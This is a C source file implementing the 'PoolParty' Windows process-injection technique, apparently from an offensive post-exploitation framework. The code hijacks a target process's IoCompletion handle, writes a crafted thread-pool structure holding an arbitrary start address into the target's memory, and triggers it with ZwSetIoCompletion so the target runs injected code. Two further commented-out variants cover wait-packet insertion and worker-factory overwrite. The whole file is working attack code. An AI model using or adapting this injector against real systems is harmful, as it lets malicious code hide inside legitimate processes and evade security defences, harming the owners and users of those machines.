#include <ntstatus.h>
#include "common.h"
#include "pool_party.h"
#include "pool_party_ext.h"

NtDll *pNtDll = NULL;
POOLPARTY_INJECTOR* poolLifeguard = NULL;

NtDll* GetOrInitNtDll() {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();

	do {
		if (pNtDll != NULL || hHeap == NULL) {
			break;
		}

		pNtDll = (NtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
		if(!pNtDll) {
			break;
		}

		HMODULE hNtDll = NULL;
		hNtDll = GetModuleHandleA("ntdll.dll");
		if(!hNtDll) {
			hNtDll = LoadLibraryA("ntdll.dll");
			bError = hNtDll == NULL;
			if(bError) {
				break;
			}
		}
		
		pNtDll->pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationProcess");
		pNtDll->pNtQueryObject = (NTSTATUS(NTAPI*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryObject");

		if(pNtDll->pNtQueryInformationProcess == NULL || pNtDll->pNtQueryObject == NULL) {
			bError = TRUE;
			break;
		}
		dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationProcess: %p NtQueryObject: %p", pNtDll->pNtQueryInformationProcess, pNtDll->pNtQueryObject);
		
		pNtDll->pZwSetIoCompletion = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR))GetProcAddress(hNtDll, "ZwSetIoCompletion");
		if (pNtDll->pZwSetIoCompletion != NULL) {
			if (poolLifeguard != NULL) {
				poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported = TRUE;
			}
		}
		dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", pNtDll->pZwSetIoCompletion);

		//ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket");
		//if (ntdll->pZwAssociateWaitCompletionPacket != NULL) {
		//	if (poolLifeguard != NULL) {
		//		poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isSystemSupported = TRUE;
		//	}
		//}
		//dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwAssociateWaitCompletionPacket: %p", ntdll->pZwAssociateWaitCompletionPacket);

		//ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
		//dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory: %p", ntdll->pNtQueryInformationWorkerFactory);

		//ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
		//dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtSetInformationWorkerFactory: %p", ntdll->pNtSetInformationWorkerFactory);

		//if (ntdll->pNtQueryInformationWorkerFactory != NULL && ntdll->pNtSetInformationWorkerFactory != NULL) {
		//	if (poolLifeguard != NULL) {
		//		poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported = TRUE;
		//	}
		//}
	}while(0);	

	if (bError) {
		HeapFree(hHeap, 0, pNtDll);
		pNtDll = NULL;
	}
	return pNtDll;
}

POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationArch) {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();
	bError = (hHeap == NULL);
	do {

		if (poolLifeguard != NULL) {
			break;
		}

		poolLifeguard = (POOLPARTY_INJECTOR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(POOLPARTY_INJECTOR));
		if(!poolLifeguard) {
			break;
		}
		
		poolLifeguard->init = FALSE;
		if (pNtDll == NULL) {
				if(!GetOrInitNtDll()) {
					// We weren't able to initialize NtDll
					// Set the bError to true so we can Free the heap allocation.
					bError = TRUE;
					break;
				}
		}
		if (dwSourceArch == PROCESS_ARCH_X64) {
			if (dwDestinationArch == PROCESS_ARCH_X64) {
				// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isSystemSupported;
			}
			poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported;
		}
		poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].handler = remote_tp_direct_insertion;
		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].handler = remote_tp_wait_insertion;
		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
		poolLifeguard->init = TRUE;

	}while(0);

	if (bError && poolLifeguard != NULL) {
		HeapFree(hHeap, 0, poolLifeguard);
		poolLifeguard = NULL;
	}
	return poolLifeguard;
}

// For now we support only Windows >= 10  and x64 | wow64 -> x64
BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
	OSVERSIONINFO os = { 0 };
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	NTSTATUS(*pRtlGetVersion)(OSVERSIONINFO * os) = (NTSTATUS(*)(OSVERSIONINFO * os)) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
	dprintf("[INJECT][supports_poolparty_injection] RtlGetVersion: %p", pRtlGetVersion);
	if (!pRtlGetVersion(&os)) {
		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
		dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
		if (os.dwMajorVersion >= 10) {
			if (dwDestinationArch == dwSourceArch && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
				return TRUE;
			}
		}
	}
	return FALSE;
}

HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess) {
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	DWORD dwInformationSizeIn = 2048;
	DWORD dwInformationSizeOut = 0;
	HANDLE hCurrProcess = GetCurrentProcess();
	HANDLE hHeap = GetProcessHeap();
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
	DWORD ntStatus = -1;
	
	if(GetOrInitNtDll() == NULL) {
		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] GetOrInitNtDll() returned NULL");
		return INVALID_HANDLE_VALUE;
	}
	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	if(lpProcessInfo == NULL) {
		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc() returned NULL");
		return INVALID_HANDLE_VALUE;
	}
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
	while (ntStatus != STATUS_SUCCESS) {
		ntStatus = pNtDll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut);
		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] NtQueryInformationProcess() : %p", ntStatus);
		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH && dwInformationSizeIn != dwInformationSizeOut) {
			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
			if(lpProcessInfo == NULL) {
				dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc() returned NULL");
				return INVALID_HANDLE_VALUE;
			}
			dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc lpProcessInfo: %p", lpProcessInfo);
			dwInformationSizeIn = dwInformationSizeOut;
			continue;
		}
		if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_INFO_LENGTH_MISMATCH) {
			HeapFree(hHeap, 0, lpProcessInfo);
			return INVALID_HANDLE_VALUE;
		}
	}
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p dwInformationSizeIn: %d", lpProcessInfo, dwInformationSizeIn);
	dwInformationSizeIn = 2048;
	dwInformationSizeOut = 0;
	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
			pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
			if (dwInformationSizeIn > dwInformationSizeOut) {
				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
					break;
				}
			}
			CloseHandle(hHijackHandle);
		}
		hHijackHandle = INVALID_HANDLE_VALUE;
	}
	HeapFree(hHeap, 0, lpObjectInfo);
	HeapFree(hHeap, 0, lpProcessInfo);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] hHijackHandle: %p", hHijackHandle);
	return hHijackHandle;
}

DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	DWORD dwResult = ERROR_INVALID_FUNCTION;
	HANDLE hHeap = GetProcessHeap();
	LPVOID *lpDirect = NULL;

	do {
		GetOrInitNtDll();
		if (pNtDll == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_INVALID_FUNCTION);
		}
		if (dwDestinationArch != PROCESS_ARCH_X64) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Currently only x86-64 destination arch is supported.", ERROR_NOT_SUPPORTED);
		}
		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_NOT_SUPPORTED)
		}
		lpDirect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TP_DIRECT_STRUCT_SIZE_X64);
		if(lpDirect == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_OUTOFMEMORY)
		}
		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);

		if (hHijackHandle == INVALID_HANDLE_VALUE) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_NOT_SUPPORTED)
		}

		if (hHijackHandle != INVALID_HANDLE_VALUE) {
			*(QWORD*)((BYTE*)lpDirect + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, TP_DIRECT_STRUCT_SIZE_X64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (!RemoteDirectAddress) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
			}
			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
			}
			dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
			dprintf("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion: %d", dwResult);
			if(dwResult != 0) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion failed.", ERROR_NOT_SUPPORTED);
			}
		}
	} while (0);
	if(lpDirect != NULL) {
		HeapFree(hHeap, 0, lpDirect);
	}
	return dwResult;
}

//DWORD remote_tp_wait_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerHandle) {
//	BOOL bError = FALSE;
//	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
//	ULONG dwInformationSizeIn = 1;
//	ULONG dwInformationSizeOut = 0;
//	pNtDll* ntDll = NULL;
//	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
//	HANDLE hHeap = GetProcessHeap();
//	POOLPARTY_INJECTOR* pLifeguard = NULL;
//	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
//	do {
//		ntDll = GetOrInitNtDll();
//		if (ntDll == NULL) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Cannot init GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
//		}
//		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isInjectionSupported) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
//
//		if (hHijackHandle == INVALID_HANDLE_VALUE) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//
//		if (hHijackHandle != INVALID_HANDLE_VALUE) {
//			PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
//			PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//			WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);
//
//			PTP_DIRECT pRemoteTpDirect = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//			WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
//			ntDll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
//			SetEvent(hEvent);
//			dwResult = 0;
//		}
//	} while (0);
//	return dwResult;
//}

//DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
//	BOOL bError = FALSE;
//	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
//	ULONG dwInformationSizeIn = 1;
//	ULONG dwInformationSizeOut = 0;
//	pNtDll* ntDll = NULL;
//	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
//	HANDLE hHeap = GetProcessHeap();
//	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
//	do {
//		ntDll = GetOrInitNtDll();
//		if (ntdll == NULL) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
//		}
//		if (poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isInjectionSupported) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//		hHijackHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
//
//		if (hHijackHandle == INVALID_HANDLE_VALUE) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//
//		if (hHijackHandle != INVALID_HANDLE_VALUE) {
//			ntdll->pNtQueryInformationWorkerFactory(hHijackHandle, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
//
//			ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
//			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WorkerFactoryInformation.StartRoutine: %ull", WorkerFactoryInformation.StartRoutine);
//			ntdll->pNtSetInformationWorkerFactory(hHijackHandle, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
//		}
//	} while (0);
//	return dwResult;
//}
//

